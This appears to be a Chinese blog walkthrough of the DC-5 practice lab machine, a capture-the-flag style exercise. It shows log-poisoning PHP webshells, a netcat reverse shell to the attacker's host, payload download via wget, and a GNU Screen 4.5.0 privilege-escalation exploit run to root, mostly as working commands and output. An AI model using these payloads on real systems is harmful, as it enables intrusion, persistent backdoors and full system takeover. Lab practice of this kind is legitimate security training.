---
 title: DC-5靶机渗透实战
 date: 2020-02-05 15:33:26
 tags: 靶机渗透
 categories: 靶机渗透
---

### 靶机介绍

这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。
靶机下载地址:http://www.five86.com/dc-5.html

### 信息搜集
直接上nmap进行扫描
> nmap -sV -A -p- 172.16.0.17
```
Nmap scan report for localhost (172.16.0.17)
Host is up (0.00029s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41519/tcp6  status
|   100024  1          46625/udp6  status
|   100024  1          53363/udp   status
|_  100024  1          59243/tcp   status
59243/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:A7:4E:87 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms localhost (172.16.0.17)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
```
**可知开放111、80、59243端口，linux主机 猜测从web页面拿到shell**

<!--more-->

### 渗透实战
1. 直接先扫目录
> dirb http://172.16.0.17/ -X .php -S
```
URL_BASE: http://172.16.0.17/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Silent Mode
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.0.17/ ----
+ http://172.16.0.17/about-us.php (CODE:200|SIZE:4292)
+ http://172.16.0.17/contact.php (CODE:200|SIZE:4282)
+ http://172.16.0.17/faq.php (CODE:200|SIZE:5645)
+ http://172.16.0.17/footer.php (CODE:200|SIZE:17)
+ http://172.16.0.17/index.php (CODE:200|SIZE:4025)
+ http://172.16.0.17/solutions.php (CODE:200|SIZE:4100)
+ http://172.16.0.17/thankyou.php (CODE:200|SIZE:852)

-----------------
```
- footer.php每次访问时间都不一样
![2020-2-5-16-50-56](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-16-50-56)
- file参数是可以通过目录字典burp爆破出来，但file常见直接手动就可试出
- 验证是否存在文件包含
![2020-2-5-16-51-16](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-16-51-16)

2. 反弹bash
- 查看nginx日志,发现会实时记录
![2020-2-5-17-15-12](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-17-15-12)
- 将phpinfo写入日志
> http://172.16.0.17/<?php phpinfo(); ?>
- 验证是可以执行的
![2020-2-5-17-17-23](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-17-17-23)
- 将mm写入日志,**passthru** - 执行外部程序并显示原始输出
> http://172.16.0.17/<?php passthru($_GET['hh']); ?>
- 直接nc反弹bash
> http://172.16.0.17/thankyou.php?file=/var/log/nginx/access.log&hh=nc%20-e%20/bin/bash%20172.16.0.10%202222
```
root@bbkali:~# nc -lvp 2222 
listening on [any] 2222 ...
connect to [172.16.0.10] from localhost [172.16.0.17] 41208
pwd
/var/www/html
```
- 用python建立交互模式
> python -c "import pty;pty.spawn('/bin/bash')"
- 查看权限发现screen-4.5.0特殊文件
```
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```
3. 提权
- 查询screen-4.5.0的利用脚本,发现存在
```
root@bbkali:/tmp/dc5# searchsploit screen 4.5
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
GNU Screen 4.5.0 - Local Privilege Esc | exploits/linux/local/41152.txt
GNU Screen 4.5.0 - Local Privilege Esc | exploits/linux/local/41154.sh
--------------------------------------- ----------------------------------------
Shellcodes: No Result
root@bbkali:/tmp/dc5# searchsploit -m 41154.sh
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators

Copied to: /tmp/dc5/41154.sh
```
- 根据文件说明编译文件
- 在本地搭建共享服务
> python -m SimpleHTTPServer 8080
![2020-2-5-19-29-4](https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-5-19-29-4)
- 通过wget下载exp,发现没有权限
> wget http://172.16.0.10:8080/run.sh
- 借助antsword使用wget功能,将新mm植入再用中国蚁剑连接
> echo '<?php @eval($_GET[cmd]);?>' >> /var/log/nginx/error.log
- 通过ftp进行上传下载,**特别注意要在tmp文件目录下才有ftp访问权限**
```
# 安装ftp
apt-get install vsftpd
# 启动服务
service vsftpd start
# 创建用户
useradd ftpuser
passwd ftpuser
mkdir /home/ftpuser
chmod 777 /home/ftpuser/
cp /tmp/dc5/* /home/ftpuser/

-----
# 连接ftp
ftp ip－address
　　输入用户名和密码
put  #发送文件
　　local-file: path
　　remote-file: path
get  #接收文件
　　local-file: path
　　remote-file: path
```
- 执行run.sh提权
```
www-data@dc-5:/tmp$ ls
ls
libhax.so  rootshell  run.sh
www-data@dc-5:/tmp$ chmod +x run.sh
chmod +x run.sh
www-data@dc-5:/tmp$ ./run.sh
./run.sh
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# whoami
whoami
root
```
- 获取到最终flag
```
# cat thisistheflag.txt
cat thisistheflag.txt


888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "  
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.
```